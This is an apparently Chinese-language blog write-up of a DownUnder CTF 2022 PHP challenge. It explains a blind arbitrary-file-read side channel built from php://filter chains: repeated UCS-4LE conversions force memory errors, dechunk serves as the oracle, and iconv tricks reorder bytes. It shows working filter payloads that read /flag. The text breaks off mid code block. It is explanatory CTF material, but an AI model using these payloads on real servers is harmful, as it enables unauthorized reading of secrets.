<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="本篇通过对 DownUnder CTF 2022 中一道题的讲解来介绍一种比较 trick 的通过侧信道读取文件内容的方法。"><title>The End of AFR</title>
<link rel=canonical href=https://zeddyu.github.io/p/the-end-of-afr/><link rel=stylesheet href=https://cdn.zdy.world/gh/zeddyu/zeddyu.github.io///scss/style.min.css integrity="sha256-fF7AdIPMSCGGaIS7UZHBfGQpV0YU38aZCzY1ucpb+iU=" crossorigin=anonymous><meta property='og:title' content="The End of AFR"><meta property='og:description' content="本篇通过对 DownUnder CTF 2022 中一道题的讲解来介绍一种比较 trick 的通过侧信道读取文件内容的方法。"><meta property='og:url' content='https://zeddyu.github.io/p/the-end-of-afr/'><meta property='og:site_name' content="Zeddy's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Sec'><meta property='article:published_time' content='2022-09-27T19:30:04+08:00'><meta property='article:modified_time' content='2022-09-27T19:30:04+08:00'><meta name=twitter:title content="The End of AFR"><meta name=twitter:description content="本篇通过对 DownUnder CTF 2022 中一道题的讲解来介绍一种比较 trick 的通过侧信道读取文件内容的方法。"><link rel="shortcut icon" href=/favicon.ico><style>body:has(.article-content){.article-readmore { display: none; }}</style><script>enScroll=!1,enFdl=!1,extCurrent=void 0,filename=void 0,targetText=void 0,splitOrigin=void 0;const lStor=localStorage,sStor=sessionStorage,doc=document,docEl=document.documentElement,docBody=document.body,docLoc=document.location,w=window,s=screen,nav=navigator||{},extensions=["pdf","xls","xlsx","doc","docx","txt","rtf","csv","exe","key","pps","ppt","pptx","7z","pkg","rar","gz","zip","avi","mov","mp4","mpe","mpeg","wmv","mid","midi","mp3","wav","wma"];function a(e,t,n,o){const j="G-PDESKL57LT",r=()=>Math.floor(Math.random()*1e9)+1,c=()=>Math.floor(Date.now()/1e3),F=()=>(sStor._p||(sStor._p=r()),sStor._p),E=()=>r()+"."+c(),_=()=>(lStor.cid_v4||(lStor.cid_v4=E()),lStor.cid_v4),m=lStor.getItem("cid_v4"),v=()=>m?void 0:enScroll==!0?void 0:"1",p=()=>(sStor.sid||(sStor.sid=c()),sStor.sid),O=()=>{if(!sStor._ss)return sStor._ss="1",sStor._ss;if(sStor.getItem("_ss")=="1")return void 0},a="1",g=()=>{if(sStor.sct)if(enScroll==!0)return sStor.sct;else x=+sStor.getItem("sct")+ +a,sStor.sct=x;else sStor.sct=a;return sStor.sct},i=docLoc.search,b=new URLSearchParams(i),h=["q","s","search","query","keyword"],y=h.some(e=>i.includes("&"+e+"=")||i.includes("?"+e+"=")),u=()=>y==!0?"view_search_results":enScroll==!0?"scroll":enFdl==!0?"file_download":"page_view",f=()=>enScroll==!0?"90":void 0,C=()=>{if(u()=="view_search_results"){for(let e of b)if(h.includes(e[0]))return e[1]}else return void 0},d=encodeURIComponent,k=e=>{let t=[];for(let n in e)e.hasOwnProperty(n)&&e[n]!==void 0&&t.push(d(n)+"="+d(e[n]));return t.join("&")},A=!1,S="https://ga.zdy.one/collect_path",M=k({v:"2",tid:j,_p:F(),sr:(s.width*w.devicePixelRatio+"x"+s.height*w.devicePixelRatio).toString(),ul:(nav.language||void 0).toLowerCase(),cid:_(),_fv:v(),_s:"1",dl:docLoc.origin+docLoc.pathname+i,dt:doc.title||void 0,dr:doc.referrer||void 0,sid:p(),sct:g(),seg:"1",en:u(),"epn.percent_scrolled":f(),"ep.search_term":C(),"ep.file_extension":e||void 0,"ep.file_name":t||void 0,"ep.link_text":n||void 0,"ep.link_url":o||void 0,_ss:O(),_dbg:A?1:void 0}),l=S+"?"+M;if(nav.sendBeacon)nav.sendBeacon(l);else{let e=new XMLHttpRequest;e.open("POST",l,!0)}}a();function sPr(){return(docEl.scrollTop||docBody.scrollTop)/((docEl.scrollHeight||docBody.scrollHeight)-docEl.clientHeight)*100}doc.addEventListener("scroll",sEv,{passive:!0});function sEv(){const e=sPr();if(e<90)return;enScroll=!0,a(),doc.removeEventListener("scroll",sEv,{passive:!0}),enScroll=!1}document.addEventListener("DOMContentLoaded",function(){let e=document.getElementsByTagName("a");for(let t=0;t<e.length;t++)if(e[t].getAttribute("href")!=null){const n=e[t].getAttribute("href"),s=n.substring(n.lastIndexOf("/")+1),o=s.split(".").pop();(e[t].hasAttribute("download")||extensions.includes(o))&&e[t].addEventListener("click",fDl,{passive:!0})}});function fDl(e){enFdl=!0;const t=e.currentTarget.getAttribute("href"),n=t.substring(t.lastIndexOf("/")+1),s=n.split(".").pop(),o=n.replace("."+s,""),i=e.currentTarget.text,r=t.replace(docLoc.origin,"");a(s,o,i,r),enFdl=!1}</script></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky compact"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=https://cdn.zdy.world/gh/zeddyu/zeddyu.github.io//img/avatar_hu_7feaa59b2ccb17f7.webp width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>Zeddy's Blog</a></h1><h2 class=site-description></h2></div></header><ol class=menu-social><li><a href=https://github.com/ZeddYu target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://zeddyu.github.io/atom.xml target=_blank title=Rss rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://x.com/ZeddYu_Lu target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/ads/><svg class="icon icon-tabler icon-tabler-ad" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M7 15v-4a2 2 0 014 0v4"/><line x1="7" y1="13" x2="11" y2="13"/><path d="M17 9v6h-1.5a1.5 1.5.0 111.5-1.5"/></svg>
<span>Advertisement</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#tldr>TL;DR</a></li><li><a href=#description>Description</a></li><li><a href=#solution>Solution</a><ol><li><a href=#part-1---the-oracle>Part 1 - The Oracle</a></li><li><a href=#part-2---flip-the-bytes>Part 2 - Flip the bytes</a></li><li><a href=#part-21---base64-and-its-two-equal-signs>Part 2.1 - Base64 and its two equal signs</a></li><li><a href=#part-22---access-all-positions>Part 2.2 - Access All Positions</a></li><li><a href=#part-23---the-oracle-of-base64>Part 2.3 - The Oracle of Base64</a></li><li><a href=#part-24---how-to-get-the-specific-base64>Part 2.4 - How to get the specific base64</a></li><li><a href=#part-3---translation>Part 3 - Translation</a></li><li><a href=#part-31---a-f>Part 3.1 - A-F</a></li><li><a href=#part-32-n-s--i-k--v-x>Part 3.2 N-S & I-K & V-X</a></li><li><a href=#part-33---the-rest-alphabets>Part 3.3 - The rest alphabets</a></li><li><a href=#part-34---the-numbers>Part 3.4 - The numbers</a></li><li><a href=#part-35---additional-notes>Part 3.5 - Additional Notes</a></li></ol></li><li><a href=#summary>Summary</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/sec/ style=background-color:#0b0;color:#fff>Sec</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/the-end-of-afr/>The End of AFR</a></h2><div class=article-subtitle>本篇通过对 DownUnder CTF 2022 中一道题的讲解来介绍一种比较 trick 的通过侧信道读取文件内容的方法。</div></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Sep 27, 2022</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>20 minute read</time></div><div class=article-readmore><a href=/p/the-end-of-afr/>Read More…</a></div></footer></div></header><section class=article-content><p>[TOC]</p><style type=text/css>.notice{--title-color:#fff;--title-background-color:#6be;--content-color:#444;--content-background-color:#e7f2fa}.notice.info{--title-background-color:#fb7;--content-background-color:#fec}.notice.tip{--title-background-color:#5a5;--content-background-color:#efe}.notice.warning{--title-background-color:#c33;--content-background-color:#fee}@media(prefers-color-scheme:dark){.notice{--title-color:#fff;--title-background-color:#069;--content-color:#ddd;--content-background-color:#023}.notice.info{--title-background-color:#a50;--content-background-color:#420}.notice.tip{--title-background-color:#363;--content-background-color:#121}.notice.warning{--title-background-color:#800;--content-background-color:#400}}body.dark .notice{--title-color:#fff;--title-background-color:#069;--content-color:#ddd;--content-background-color:#023}body.dark .notice.info{--title-background-color:#a50;--content-background-color:#420}body.dark .notice.tip{--title-background-color:#363;--content-background-color:#121}body.dark .notice.warning{--title-background-color:#800;--content-background-color:#400}.notice{padding:18px;line-height:24px;margin-bottom:24px;border-radius:4px;color:var(--content-color);background:var(--content-background-color)}.notice p:last-child{margin-bottom:0}.notice-title{margin:-18px -18px 12px;padding:4px 18px;border-radius:4px 4px 0 0;font-weight:700;color:var(--title-color);background:var(--title-background-color)}.icon-notice{display:inline-flex;align-self:center;margin-right:8px}.icon-notice img,.icon-notice svg{height:1em;width:1em;fill:currentColor}.icon-notice img,.icon-notice.baseline svg{top:.125em;position:relative}</style><div class="notice tip"><p class=notice-title><span class="icon-notice baseline"><svg viewBox="300.5 134 300 300"><path d="M551.281 252.36c0-3.32-1.172-6.641-3.515-8.985l-17.774-17.578c-2.344-2.344-5.469-3.711-8.789-3.711-3.32.0-6.445 1.367-8.789 3.71l-79.687 79.493-44.141-44.14c-2.344-2.344-5.469-3.712-8.79-3.712-3.32.0-6.444 1.368-8.788 3.711l-17.774 17.579c-2.343 2.343-3.515 5.664-3.515 8.984s1.172 6.445 3.515 8.789l70.704 70.703c2.343 2.344 5.664 3.711 8.789 3.711 3.32.0 6.64-1.367 8.984-3.71l106.055-106.056c2.343-2.343 3.515-5.468 3.515-8.789zM600.5 284c0 82.813-67.188 150-150 150-82.813.0-150-67.188-150-150 0-82.813 67.188-150 150-150 82.813.0 150 67.188 150 150z"/></svg>
</span>Tip</p><p>文章首发于跳跳堂：<a class=link href=https://tttang.com/archive/1755/ target=_blank rel=noopener>The End of AFR?</a></p></div><h2 id=tldr>TL;DR</h2><p>使用 UCS-4LE 等编码技巧让 PHP 产生内存错误导致服务器产生 500 错误，配合 dechunk 编码使得前面的错误正常化从而获得一个盲注的判断依据，使用该依据以及编码技巧逐个判断盲注出文件内容，进而可以造成任意文件内容读取。</p><p>标题中 AFR 指的是 Arbitrary File Read ，因为本文跟 <a class=link href=https://tttang.com/archive/1395/ target=_blank rel=noopener>hxp CTF 2021 - The End Of LFI?</a> 有很大的关系，所以使用了该标题。</p><h2 id=description>Description</h2><p>依旧先贴作者 repo 以示尊重：<a class=link href=https://github.com/DownUnderCTF/Challenges_2022_Public/tree/main/web/minimal-php target=_blank rel=noopener>https://github.com/DownUnderCTF/Challenges_2022_Public/tree/main/web/minimal-php</a></p><p>以下测试如无特殊说明，则均在 Docker 环境中；本篇没有什么新的东西，只是对作者的细节进行复盘，如果能看得懂作者 exp 全部部分细节都在干什么，可以忽略本篇。</p><p>题目源代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>file</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span></code></pre></td></tr></table></div></div><p>题目 Docker :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-swift data-lang=swift><span class=line><span class=cl><span class=n>FROM</span> <span class=n>php</span><span class=p>:</span><span class=mf>8.1</span><span class=o>-</span><span class=n>apache</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>RUN</span> <span class=n>mv</span> <span class=s>&#34;$PHP_INI_DIR/php.ini-production&#34;</span> <span class=s>&#34;$PHP_INI_DIR/php.ini&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>COPY</span> <span class=n>index</span><span class=p>.</span><span class=n>php</span> <span class=o>/</span><span class=kd>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>index</span><span class=p>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=n>COPY</span> <span class=n>flag</span> <span class=o>/</span><span class=n>flag</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=solution>Solution</h2><p>乍一看题目，使用 PHP 8 ，并且使用了较为敏感的 file 函数，但是对于 PHP 8 我们可知 phar 反序列化已经没了，我们需要找到另一个方法，比如 PHP 默认一些有写文件操作的地方，但是话又说回来，这也并不是我们之前熟悉的 LFI 了，即使有写文件，利用 file 函数又能够做什么呢？</p><p>一开始以为是 PHP 8 对于文件操作新增了什么代码，但是 diff 7.4 之后发现压根也没啥改动…所以换思路到一些侧信道攻击上，但是众所周知，侧信道需要一个明确的足以判断的信道，即使 file 函数支持使用流操作，但是怎么样的流操作能让我们侧信道呢？</p><p>所以找到这个侧信道的关键点就成了解决本题的关键所在，也就是 if 语句中的那个条件，后续我们用 Oracle 来称呼这个关键点（因为大部分侧信道的信道或者关键点什么好像基本都用 oracle 这个称呼）。</p><h3 id=part-1---the-oracle>Part 1 - The Oracle</h3><p>因为使用了 production 的配置文件，所以对于一些报错等方式在这里就不太适用了，但是除了页面报错之外，我们还比较容易想到的就是服务端报错，显性的服务端报错即是服务器直接返回了 50x HTTP 状态码。</p><p>如何找到这个可以让服务端报错的 Oracle 呢？</p><p>在这里作者给出的解决方案是，使用 php filter 配合 convert.iconv.L1.UCS-4LE 编码，通过数次该编码规则可以将原字符串长度增长数倍，到一定程度会导致 PHP 产生内存错误：</p><p><img src=https://s1.ax1x.com/2022/09/27/xZjxN4.png loading=lazy alt=image.png></p><p>产生错误的方式有了，那么如何弄出不产生错误呢？</p><p>作者在 <a class=link href=https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724 target=_blank rel=noopener>php filter dechunk</a> 部分发现，其对于字符的处理存在一个范围限制，因为对于 chunk 编码来说，大部分都是以十六进制来表示长度的（这里很有可能原本就是用于解析类似 HTTP 中 chunked 编码规则的），所以十六进制的字符范围只在 a-fA-f0-9 这个范围内。并且根据源码可知，php 只对第一个字节进行了判断，所以对于第二个字节其实无关紧要。我们可以做个简单尝试：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/dechunk/resource=data:,a&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/dechunk/resource=data:,g&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=s2>&#34;g&#34;</span>
</span></span><span class=line><span class=cl><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/dechunk/resource=data:,ga&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=s2>&#34;ga&#34;</span>
</span></span><span class=line><span class=cl><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/dechunk/resource=data:,ag&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=s2>&#34;&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到，在使用 dechunk filter 的时候，如果我们要编码的字符第一个字节不在十六进制编码范围内，PHP 会原样输出，而在此范围内的则会输出为空。</p><p>那么配合这个 dechunk 我们可以干什么呢？既然 dechunk 有判断的机制在里面，所以我们貌似可以利用这个机制来作为我们的 Oracle ，那么我们是不是可以配合之前的 convert.iconv.L1.UCS-4LE 编码，倘若我们要 Leak 的字符串内容开头范围在 a-fA-F0-9 范围内，因为 dechunk 编码清空了字符串，就不会产生原来由于长度过长导致的报错；如果不在就会原样输出继续产生长度过长导致的内存错误。</p><p><img src=https://s1.ax1x.com/2022/09/27/xZj5NQ.png loading=lazy alt=image.png></p><p>如上图，我们首先可以测试出服务器上 PHP 对于内存报错的临界值。红圈部分相对于蓝圈部分多了一次 convert.iconv.L1.UCS-4LE 编码，绿圈部分相对于红圈部分多了一次 dechunk ，可以看到绿圈部分由于 dechunk 的存在就不会导致 PHP 产生内存错误了。</p><p>测试部分如下（注意，不同配置的机器可能对于引起 PHP 报错的长度不同，需要适当调节使用的 convert.iconv.L1.UCS-4LE 编码的次数）：</p><p>不出错：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.base64-encode|convert.base64-encode|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE/resource=/flag&#34;</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><p>出错：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.base64-encode|convert.base64-encode|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE/resource=/flag&#34;</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><p>在报错基础上使用了 dechunk 之后不会出错：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/dechunk|convert.base64-encode|convert.base64-encode|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE/resource=/flag&#34;</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><p>所以根据以上现象，我们基本得到了一个可以用于判断字符串的第一个字符是否在 a-fA-F0-9 这个范围内的 Oracle 了。那么这里还仅仅只是第一步，因为目前我们只能判断第一个字节，那么接下来我们的思路就是处理剩余的字节，以及怎么准确判断这个字节是什么。</p><h3 id=part-2---flip-the-bytes>Part 2 - Flip the bytes</h3><p>这部分其实在作者的 solution 注释中已经解释的非常的详细了，不过这里仍然有些地方需要我们注意。</p><p>PS: 因为主要我们思路明确了，其实对于找 payload ，如何找并没有太多的技巧，包括我问了出题人，这些 payload 也都是通过 iconv 排列组合挨个查找自己所需要的 payload 所得到的，所以这里不会做解释后文每一个 iconv 是怎么来的…都是根据自己需求找出来的，无论是 fuzz 或者排列组合都好，找出来了，满足自己需求了就行</p><p>所以有没有一种编码形式，可以让我们交换字符串中字符的位置呢？（当然有啦，不然这个题就做不下去了。下面我们以翻转 8 字节 abcdefgh 为例。</p><p>首先，使用 convert.iconv.CSUNICODE.UCS-2BE 我们可以前后交换每两个字节的位置，我们称这个编码规则为 r2 ：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.iconv.CSUNICODE.UCS-2BE/resource=data:,abcdefgh&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span> <span class=s2>&#34;badcfehg&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>使用 convert.iconv.UCS-4LE.10646-1:1993 我们可以将每四个字节的位置逆序，我们称这个编码规则为 r4 ：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdefgh&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=s2>&#34;dcbahgfe&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>所以目前我们可以比较直接的获取到原字符串中第 2 个字节和第 4 个字节，那么至于第 3 个字节以及其他字节咋办？</p><p>对于第 3 个字节，根据 r2 的结果，其实我们只需要再通过一次 r4 即可把 c 放到前面了：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
